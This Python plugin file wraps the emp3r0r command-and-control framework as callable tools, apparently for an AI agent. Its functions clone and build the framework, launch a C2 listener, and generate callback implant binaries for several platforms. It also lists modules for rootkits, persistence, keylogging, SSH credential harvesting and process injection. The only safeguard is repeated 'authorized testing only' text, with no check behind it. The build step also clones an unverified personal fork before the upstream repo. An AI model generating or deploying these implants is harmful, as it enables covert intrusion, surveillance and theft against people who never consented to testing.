"""
ARGOS Plugin: emp3r0r — Advanced C2 Framework
Linux/Windows post-exploitation C2 with covert channels, SSHd implant, Shadowsocks,
Tor hidden service, auto rootkit, and process hollowing.

⚠️  AUTHORIZED PENETRATION TESTING ONLY.
    Use ONLY on systems you own or have explicit written permission to test.
    Unauthorized use is illegal under computer crime laws worldwide.

Auto-installs from: https://github.com/wlmzz/emp3r0r (or jm33-m0/emp3r0r)
Requires: Go >= 1.21, build-essential, libpcap-dev
Builds to: /opt/argos/c2/emp3r0r/

Repo: https://github.com/jm33-m0/emp3r0r
"""
from __future__ import annotations
import os, subprocess, json, shutil
from pathlib import Path

MANIFEST = {
    "id":          "emp3r0r",
    "name":        "emp3r0r C2 Framework",
    "description": "Advanced Linux/Windows C2 framework with covert channels, SSHd implant, Tor, auto rootkit. PENTEST ONLY.",
    "version":     "1.0.0",
    "author":      "ARGOS",
    "requires":    [],
}

_EMP3R0R_DIR = Path("/opt/argos/c2/emp3r0r")
_EMP3R0R_BIN = _EMP3R0R_DIR / "emp3r0r"
_TIMEOUT     = 300


def _ensure_emp3r0r() -> dict:
    """Clone and build emp3r0r. Returns {'ok': True} or {'error': ...}."""
    if _EMP3R0R_BIN.exists():
        return {"ok": True}

    _EMP3R0R_DIR.parent.mkdir(parents=True, exist_ok=True)

    # Clone the repo (user fork first, fallback to upstream)
    if not _EMP3R0R_DIR.exists():
        for repo in ["wlmzz/emp3r0r", "jm33-m0/emp3r0r"]:
            r = subprocess.run(
                ["git", "clone", "--depth=1", "-q",
                 f"https://github.com/{repo}.git", str(_EMP3R0R_DIR)],
                capture_output=True, timeout=120
            )
            if r.returncode == 0:
                break
        else:
            return {"error": "Failed to clone emp3r0r repository"}

    # Check for Go
    if not shutil.which("go"):
        return {"error": "Go not found. Install: apt-get install golang"}

    # Build
    build_r = subprocess.run(
        ["make", "build"],
        capture_output=True, text=True, timeout=_TIMEOUT,
        cwd=str(_EMP3R0R_DIR)
    )
    if build_r.returncode != 0:
        # Try direct go build
        build_r = subprocess.run(
            ["go", "build", "-o", "emp3r0r", "./cmd/emp3r0r/"],
            capture_output=True, text=True, timeout=_TIMEOUT,
            cwd=str(_EMP3R0R_DIR)
        )
    if not _EMP3R0R_BIN.exists():
        return {
            "error": "emp3r0r build failed",
            "stdout": build_r.stdout[-1000:],
            "stderr": build_r.stderr[-1000:],
        }

    return {"ok": True}


def emp3r0r_build(force: bool = False) -> dict:
    """Build emp3r0r from source. Clones repo and compiles.
    ⚠️  AUTHORIZED PENETRATION TESTING ONLY.

    force: rebuild even if binary exists (default: false)
    """
    if force and _EMP3R0R_BIN.exists():
        _EMP3R0R_BIN.unlink()

    result = _ensure_emp3r0r()
    if "error" in result:
        return result

    return {
        "status":    "built",
        "binary":    str(_EMP3R0R_BIN),
        "c2_dir":    str(_EMP3R0R_DIR),
        "note":      "AUTHORIZED PENETRATION TESTING ONLY",
        "usage":     "Use emp3r0r_gen_agent() to generate implant, emp3r0r_start_cc() to launch C2 server",
    }


def emp3r0r_start_cc(listen_host: str = "0.0.0.0",
                      listen_port: int = 8000,
                      background: bool = True) -> dict:
    """Start the emp3r0r C2 (Command & Control) server.
    ⚠️  AUTHORIZED PENETRATION TESTING ONLY.

    listen_host: bind address (default: 0.0.0.0)
    listen_port: C2 listening port (default: 8000)
    background:  start in background (default: true)
    """
    check = _ensure_emp3r0r()
    if "error" in check:
        return check

    cmd = [str(_EMP3R0R_BIN), "--cc",
           "--listen", f"{listen_host}:{listen_port}"]

    if background:
        # Start as background process
        try:
            proc = subprocess.Popen(
                cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                cwd=str(_EMP3R0R_DIR)
            )
            return {
                "status":     "started",
                "pid":        proc.pid,
                "listen":     f"{listen_host}:{listen_port}",
                "cc_dir":     str(_EMP3R0R_DIR),
                "note":       "AUTHORIZED PENETRATION TESTING ONLY",
                "stop_cmd":   f"kill {proc.pid}",
                "connect_cmd": f"./emp3r0r --cc --connect {listen_host}:{listen_port}",
            }
        except Exception as e:
            return {"error": str(e)}
    else:
        # Run interactively (blocks)
        try:
            r = subprocess.run(
                cmd, capture_output=True, text=True,
                timeout=60, cwd=str(_EMP3R0R_DIR)
            )
            return {
                "returncode": r.returncode,
                "output":     (r.stdout + r.stderr)[-2000:],
            }
        except subprocess.TimeoutExpired:
            return {"error": "CC server timed out in interactive mode — use background=true"}
        except Exception as e:
            return {"error": str(e)}


def emp3r0r_gen_agent(cc_host: str, cc_port: int = 8000,
                       platform: str = "linux",
                       arch: str = "amd64",
                       output_path: str = "") -> dict:
    """Generate an emp3r0r agent (implant) binary.
    ⚠️  AUTHORIZED PENETRATION TESTING ONLY — deploy only on systems you own/have permission.

    cc_host:     C2 server IP or hostname
    cc_port:     C2 server port (default: 8000)
    platform:    target OS: 'linux' | 'windows' | 'darwin' (default: linux)
    arch:        target arch: 'amd64' | 'arm64' | '386' (default: amd64)
    output_path: where to save the agent binary
    """
    check = _ensure_emp3r0r()
    if "error" in check:
        return check

    if not output_path:
        ext = ".exe" if platform == "windows" else ""
        output_path = str(_EMP3R0R_DIR / f"agent_{platform}_{arch}{ext}")

    cmd = [
        str(_EMP3R0R_BIN), "--gen",
        "--cc-host", cc_host,
        "--cc-port", str(cc_port),
        "--platform", platform,
        "--arch",     arch,
        "--output",   output_path,
    ]

    try:
        r = subprocess.run(
            cmd, capture_output=True, text=True, timeout=_TIMEOUT,
            cwd=str(_EMP3R0R_DIR)
        )
        output = (r.stdout + r.stderr)[-2000:]

        if Path(output_path).exists():
            size = Path(output_path).stat().st_size
            return {
                "status":      "generated",
                "agent_path":  output_path,
                "size_bytes":  size,
                "platform":    platform,
                "arch":        arch,
                "cc_host":     cc_host,
                "cc_port":     cc_port,
                "output":      output[-500:],
                "note":        "AUTHORIZED PENETRATION TESTING ONLY",
            }
        return {
            "error":   "Agent binary not found after generation",
            "output":  output[-1000:],
            "returncode": r.returncode,
        }
    except subprocess.TimeoutExpired:
        return {"error": f"Agent generation timed out after {_TIMEOUT}s"}
    except Exception as e:
        return {"error": str(e)}


def emp3r0r_list_modules() -> dict:
    """List available emp3r0r post-exploitation modules.
    ⚠️  AUTHORIZED PENETRATION TESTING ONLY.
    """
    check = _ensure_emp3r0r()
    if "error" in check:
        return check

    try:
        r = subprocess.run(
            [str(_EMP3R0R_BIN), "--list-modules"],
            capture_output=True, text=True, timeout=30,
            cwd=str(_EMP3R0R_DIR)
        )
        return {
            "source":  "emp3r0r",
            "modules": (r.stdout + r.stderr).strip(),
            "note":    "AUTHORIZED PENETRATION TESTING ONLY",
        }
    except Exception as e:
        # Fall back to known modules from docs
        return {
            "source": "emp3r0r",
            "note":   "AUTHORIZED PENETRATION TESTING ONLY",
            "known_modules": [
                "get_root        — privilege escalation (auto rootkit)",
                "persistence     — install persistent backdoor",
                "port_fwd        — TCP port forwarding",
                "proxy           — SOCKS5 proxy through agent",
                "shell           — interactive remote shell",
                "file_manager    — upload/download files",
                "process_inject  — inject into processes",
                "ssh_harvester   — harvest SSH credentials",
                "net_scan        — internal network scanner",
                "screenshot      — capture screenshots",
                "keylogger       — capture keystrokes",
                "shadowsocks     — covert Shadowsocks tunnel",
                "tor_proxy       — Tor hidden service C2",
            ],
        }


TOOLS = {
    "emp3r0r_build": {
        "fn": emp3r0r_build,
        "description": (
            "Build emp3r0r C2 framework from source (clones repo + compiles). "
            "⚠️ AUTHORIZED PENETRATION TESTING ONLY."
        ),
        "parameters": {
            "type": "object",
            "properties": {
                "force": {"type": "boolean", "description": "Rebuild even if binary exists (default: false)"},
            },
            "required": []
        }
    },
    "emp3r0r_start_cc": {
        "fn": emp3r0r_start_cc,
        "description": (
            "Start the emp3r0r C2 server. Agents connect back to this. "
            "⚠️ AUTHORIZED PENETRATION TESTING ONLY."
        ),
        "parameters": {
            "type": "object",
            "properties": {
                "listen_host": {"type": "string",  "description": "Bind address (default: 0.0.0.0)"},
                "listen_port": {"type": "integer", "description": "C2 port (default: 8000)"},
                "background":  {"type": "boolean", "description": "Start in background (default: true)"},
            },
            "required": []
        }
    },
    "emp3r0r_gen_agent": {
        "fn": emp3r0r_gen_agent,
        "description": (
            "Generate an emp3r0r agent/implant binary for a target platform. "
            "⚠️ AUTHORIZED PENETRATION TESTING ONLY — deploy only on systems you own/have permission."
        ),
        "parameters": {
            "type": "object",
            "properties": {
                "cc_host":     {"type": "string",  "description": "C2 server IP/hostname"},
                "cc_port":     {"type": "integer", "description": "C2 port (default: 8000)"},
                "platform":    {"type": "string",  "description": "'linux' | 'windows' | 'darwin' (default: linux)"},
                "arch":        {"type": "string",  "description": "'amd64' | 'arm64' | '386' (default: amd64)"},
                "output_path": {"type": "string",  "description": "Output path for agent binary"},
            },
            "required": ["cc_host"]
        }
    },
    "emp3r0r_list_modules": {
        "fn": emp3r0r_list_modules,
        "description": (
            "List emp3r0r post-exploitation modules: get_root, persistence, port_fwd, proxy, "
            "shell, file_manager, process_inject, ssh_harvester, net_scan, etc. "
            "⚠️ AUTHORIZED PENETRATION TESTING ONLY."
        ),
        "parameters": {"type": "object", "properties": {}, "required": []}
    },
}
